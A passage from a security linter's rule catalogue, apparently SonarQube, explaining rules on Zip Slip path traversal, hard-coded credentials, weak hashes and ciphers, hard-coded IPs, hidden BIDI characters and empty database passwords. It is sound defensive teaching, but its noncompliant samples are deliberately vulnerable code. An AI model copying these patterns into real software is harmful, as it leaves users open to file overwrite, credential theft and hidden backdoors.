zipEntry.entryName);\n        if (canonicalPath.startsWith(unzipTargetDir)) {\n            let writer = fs.createWriteStream(canonicalPath);\n            writer.write(zipEntry.getData().toString(\"utf8\"));\n        }\n    });\n});\n</pre>\n<h3>How does this work?</h3>\n<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>\n<p>The validation should be done as follow:</p>\n<ol>\n  <li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative\n  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>\n  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end\nwith a path separator:</p>\n<pre>\nconst AdmZip = require(\"adm-zip\");\n\nconst targetDirectory = \"/Users/John\";\n\napp.get('/example', (req, res) =&gt; {\n    const canonicalPath = path.normalize(targetDirectory + req.query.filename)\n\n    if (canonicalPath.startsWith(targetDirectory)) {\n        const zip = new AdmZip(canonicalPath);\n\t    const zipEntries = zip.getEntries();\n\n    \tzipEntries.forEach(function (zipEntry) {\n            var writer = fs.createWriteStream(zipEntry.entryName);\n            writer.write(zipEntry.getData().toString(\"utf8\"));\n\t    });\n    }\n});\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to\nensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/advisories/GHSA-xwg4-93c6-3h42\">Here is a real-life example of this vulnerability.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://snyk.io/research/zip-slip-vulnerability\">snyk</a> - Zip Slip Vulnerability </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "swift:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nlet postData = \"username=Steve&amp;password=123456\".data(using: .utf8)  // Sensitive\n//...\nvar request = URLRequest(url: url)\nrequest.HTTPBody = postData\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlet postData = \"username=\\(getEncryptedUser())&amp;password=\\(getEncryptedPass())\".data(using: .utf8)\n//...\nvar request = URLRequest(url: url)\nrequest.HTTPBody = postData\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "swift:S2070": {
        "name": "SHA-1 and Message-Digest hash algorithms should not be used in secure contexts",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=swift%3AS4790'>S4790</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,\nit takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash\nvalue gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,\nMD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>\n<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nimport CryptoSwift\n\nlet bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]\nlet digest = input.md5() // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport CryptoSwift\n\nlet bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]\nlet digest = input.sha256() // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/328\">CWE-328 - Reversible One-Way Hash</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://shattered.io/\">SHAttered</a> - The first concrete collision attack against SHA-1. </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "swift:S2278": {
        "name": "Neither DES (Data Encryption Standard) nor DESede (3DES) should be used",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=swift%3AS5547'>S5547</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>\n<blockquote>\n  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer\n  provides the security that is needed to protect federal government information.</p>\n  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>\n</blockquote>\n<p>For similar reasons, RC2 should also be avoided.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nlet cryptor = try Cryptor(operation: .encrypt, algorithm: .des, options: .none, key: key, iv: []) // Noncompliant\n\nlet crypt = CkoCrypt2()\ncrypt.CryptAlgorithm = \"3des\" // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nlet cryptor = try Cryptor(operation: .encrypt, algorithm: .aes, options: .none, key: key, iv: []) // Compliant\n\nlet crypt = CkoCrypt2()\ncrypt.CryptAlgorithm = \"aes\" // Compliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/326\">CWE-326 - Inadequate Encryption Strength</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE\">DES / DESede Unsafe</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "swift:S5547": {
        "name": "Cipher algorithms should be robust",
        "htmlDesc": "<p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for\nseveral important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and\nsecure by the cryptography community.</p>\n<h3>What is the potential impact?</h3>\n<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Theft of sensitive data</h4>\n<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>\n<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted\nvalues are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>\n<h2>How to fix it in CommonCrypto</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport CommonCrypto\n\nlet algorithm = CCAlgorithm(kCCAlgorithmDES) // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport Crypto\n\nlet sealedBox = try AES.GCM.seal(input, using: key)\n</pre>\n<h3>How does this work?</h3>\n<h4>Use a secure algorithm</h4>\n<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an\nalgorithm is the Advanced Encryption Standard (AES).</p>\n<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "swift:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nlet host = Host(address: \"192.168.12.42\")\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nlet host = Host(address: configuration.ipAddress)\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n  <li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href=\"https://datatracker.ietf.org/doc/html/rfc3849\">RFC\n  3849</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "swift:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport CryptoSwift\n\nlet bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]\nlet digest = input.md5() // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nimport CryptoSwift\n\nlet bytes:Array&lt;UInt8&gt; = [0x01, 0x02, 0x03]\nlet digest = input.sha512() // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "text:S6389": {
        "name": "Using bidirectional characters is security-sensitive",
        "htmlDesc": "<p>Using bidirectional (BIDI) characters can lead to incomprehensible code.</p>\n<p>The Unicode encoding contains BIDI control characters that are used to display text right-to-left (RTL) instead of left-to-right (LTR). This is\nnecessary for certain languages that use RTL text. The BIDI characters can be used to create a difference in the code between what a human sees and\nwhat a compiler or interpreter sees. An advisary might use this feature to hide a backdoor in the code that will not be spotted by a human reviewer as\nit is not visible.</p>\n<p>This can lead to supply chain attacks since the backdoored code might persist over a long time without being detected and can even be included in\nother projects, for example in the case of libraries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> This text requires a right-to-left writing system (to use Arabic or Hebrew words, for example). </li>\n  <li> The author of this text is a legitimate user. </li>\n  <li> This text contains a standard instruction, comment or sequence of characters. </li>\n</ul>\n<p>There is a risk if you answered no to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Open the file in an editor that reveals non-ASCII characters and remove all BIDI control characters that are not intended.</p>\n<p>If hidden characters are illegitimate, this issue could indicate a potential ongoing attack on the code. Therefore, it would be best to warn your\norganization’s security team about this issue.</p>\n<p>Required opening BIDI characters should be explicitly closed with the PDI character.</p>\n<h2>Sensitive Code Example</h2>\n<p>A hidden BIDI character is present in front of <code>return</code>:</p>\n<pre>\ndef subtract_funds(account: str, amount: int):\n    ''' Subtract funds from bank account then ⁧''' ;return\n    bank[account] -= amount\n    return\n</pre>\n<p>The executed code looks like the following:</p>\n<pre>\ndef subtract_funds(account: str, amount: int):\n    ''' Subtract funds from bank account then &lt;RLI&gt;''' ;return\n    bank[account] -= amount\n    return\n</pre>\n<h2>Compliant Solution</h2>\n<p>No hidden BIDI characters are present:</p>\n<pre>\ndef subtract_funds(account: str, amount: int):\n    ''' Subtract funds from bank account then return; '''\n    bank[account] -= amount\n    return\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://unicode.org/reports/tr9/\">Bidirectional Algorithm</a> - Unicode Standard </li>\n  <li> <a href=\"https://en.wikipedia.org/wiki/Bidirectional_text\">Wikipedia</a> - Bidirectional Text </li>\n  <li> <a href=\"https://www.trojansource.codes/trojan-source.pdf\">Trojan Source Report</a> </li>\n  <li> <a href=\"https://www.trojansource.codes/trojan-source.pdf#page=15\">Trojan Source Report</a> - IDEs revealing hidden characters </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/94\">CWE-94 - Improper Control of Generation of Code ('Code Injection')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "csharpsquid:S2115": {
        "name": "A secure password should be used when connecting to a database",
        "htmlDesc": "<p>When accessing a database, an empty password should be avoided as it introduces a weakness.</p>\n<h2>Why is this an issue?</h2>\n<p>When a database does not require a password for authentication, it allows anyone to access and manipulate the data stored within it. Exploiting\nthis vulnerability typically involves identifying the target database and establishing a connection to it without the need for any authentication\ncredentials.</p>\n<h3>What is the potential impact?</h3>\n<p>Once connected, an attacker can perform various malicious actions, such as viewing, modifying, or deleting sensitive information, potentially\nleading to data breaches or unauthorized access to critical systems. It is crucial to address this vulnerability promptly to ensure the security and\nintegrity of the database and the data it contains.</p>\n<h4>Unauthorized Access to Sensitive Data</h4>\n<p>When a database lacks a password for authentication, it opens the door for unauthorized individuals to gain access to sensitive data. This can\ninclude personally identifiable information (PII), financial records, intellectual property, or any other confidential information stored in the\ndatabase. Without proper access controls in place, malicious actors can exploit this vulnerability to retrieve sensitive data, potentially leading to\nidentity theft, financial loss, or reputational damage.</p>\n<h4>Compromise of System Integrity</h4>\n<p>Without a password requirement, unauthorized individuals can gain unrestricted access to a database, potentially compromising the integrity of the\nentire system. Attackers can inject malicious code, alter configurations, or manipulate data within the database, leading to system malfunctions,\nunauthorized system access, or even complete system compromise. This can disrupt business operations, cause financial losses, and expose the\norganization to further security risks.</p>\n<h4>Unwanted Modifications or Deletions</h4>\n<p>The absence of a password for database access allows anyone to make modifications or deletions to the data stored within it. This poses a\nsignificant risk, as unauthorized changes can lead to data corruption, loss of critical information, or the introduction of malicious content. For\nexample, an attacker could modify financial records, tamper with customer orders, or delete important files, causing severe disruptions to business\nprocesses and potentially leading to financial and legal consequences.</p>\n<p>Overall, the lack of a password configured to access a database poses a serious security risk, enabling unauthorized access, data breaches, system\ncompromise, and unwanted modifications or deletions. It is essential to address this vulnerability promptly to safeguard sensitive data, maintain\nsystem integrity, and protect the organization from potential harm.</p>\n<h2>How to fix it in Entity Framework Core</h2>\n<h3>Code examples</h3>\n<p>The following code uses an empty password to connect to a SQL Server database.</p>\n<p>The vulnerability can be fixed by using Windows authentication (sometimes referred to as integrated security).</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"302\" data-diff-type=\"noncompliant\">\nprotected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n{\n  optionsBuilder.UseSqlServer(\"Server=myServerAddress;Database=myDataBase;User Id=myUsername;Password=\"); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"302\" data-diff-type=\"compliant\">\nprotected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)\n{\n  optionsBuilder.UseSqlServer(\"Server=myServerAddress;Database=myDataBase;Integrated Security=True\");\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Windows authentication (integrated security)</h4>\n<p>When the connection string includes the <code>Integrated Security=true</code> parameter, it enables Windows authentication (sometimes called\nintegrated security) for the database connection. With integrated security, the user’s Windows credentials are used to authenticate and authorize\naccess to the database. It eliminates the need for a separate username and password for the database connection. Integrated security simplifies\nauthentication and leverages the existing Windows authentication infrastructure for secure database access in your C# application.</p>\n<p>It’s important to note that when using integrated security, the user running the application must have the necessary permissions to access the\ndatabase. Ensure that the user account running the application has the appropriate privileges and is granted access to the database.</p>\n<p>The syntax employed in connection strings varies by provider:</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <tbody>\n    <tr>\n      <td><p>Syntax</p></td>\n      <td><p>Supported by</p></td>\n    </tr>\n    <tr>\n      <td><p><code>Integrated Security=true;</code></p></td>\n      <td><p>SQL Server, Oracle, Postgres</p></td>\n    </tr>\n    <tr>\n      <td><p><code>Integrated Security=SSPI;</code></p></td>\n      <td><p>SQL Server, OLE DB</p></td>\n    </tr>\n    <tr>\n      <td><p><code>Integrated Security=yes;</code></p></td>\n      <td><p>MySQL</p></td>\n    </tr>\n    <tr>\n      <td><p><code>Trusted_Connection=true;</code></p></td>\n      <td><p>SQL Server</p></td>\n    </tr>\n    <tr>\n      <td><p><code>Trusted_Connection=yes;</code></p></td>\n      <td><p>ODBC</p></td>\n    </tr>\n  </tbody>\n</table>\n<p>Note: Some providers such as MySQL do not support Windows authentication with .NET Core.</p>\n<h3>Pitfalls</h3>\n<h4>Hard-coded passwords</h4>\n<p>It could be tempting to replace the empty password with a hard-coded one. Hard-coding passwords in the code can pose significant security risks.\nHere are a few reasons why it is not recommended:</p>\n<ol>\n  <li> Security Vulnerability: Hard-coded passwords can be easily discovered by anyone who has access to the code, such as other developers or\n  attackers. This can lead to unauthorized access to the database and potential data breaches. </li>\n  <li> Lack of Flexibility: Hard-coded passwords make it difficult to change the password without modifying the code. If the password needs to be\n  updated, it would require recompiling and redeploying the code, which can be time-consuming and error-prone. </li>\n  <li> Version Control Issues: Storing passwords in code can lead to version control issues. If the code is shared or stored in a version control\n  system, the password will be visible to anyone with access to the repository, which is a security risk. </li>\n</ol>\n<p>To mitigate these risks, it is recommended to use secure methods for storing and retrieving passwords, such as using environment variables,\nconfiguration files, or secure key management systems. These methods allow for better security, flexibility, and separation of sensitive information\nfrom the codebase.</p>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.microsoft.com/en-us/troubleshoot/aspnet/create-web-config\">Create the Web.config file for an ASP.NET application</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/521\">CWE-521 - Weak Password Requirements</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "csharpsquid:S3329": {
        "name": "Cipher Block Chaining IVs should be unpredictable",
        "htmlDesc": "<p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>\n<h2>Why is this an issue?</h2>\n<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used\nfor several important reasons:</p>\n<ul>\n  <li> Confidentiality, privacy, and intellectual property protection </li>\n  <li> Security during transmission or on storage devices </li>\n  <li> Data integrity, general trust, and authentication </li>\n</ul>\n<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>\n<ol>\n  <li> No encryption is unbreakable. </li>\n  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>\n</ol>\n<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an\ninitialization vector (IV), also called a \"starting variable\" (SV).</p>\n<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same\nciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>\n<h3>What is the potential impact?</h3>\n<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that\nencryption was supposed to protect.</p>\n<p>Depending on the recovered data, the impact may vary.</p>\n<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>\n<h4>Additional attack surface</h4>\n<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can\nfurther exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a\nthird party to modify them under normal circumstances.</p>\n<h4>Breach of confidentiality and privacy</h4>\n<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,\nfinancial loss, reputational damage, or unauthorized access to confidential systems.</p>\n<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>\n<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and\nstakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>\n<h4>Legal and compliance issues</h4>\n<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the\nplaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>\n<h2>How to fix it in .NET</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nusing System.IO;\nusing System.Security.Cryptography;\n\npublic void 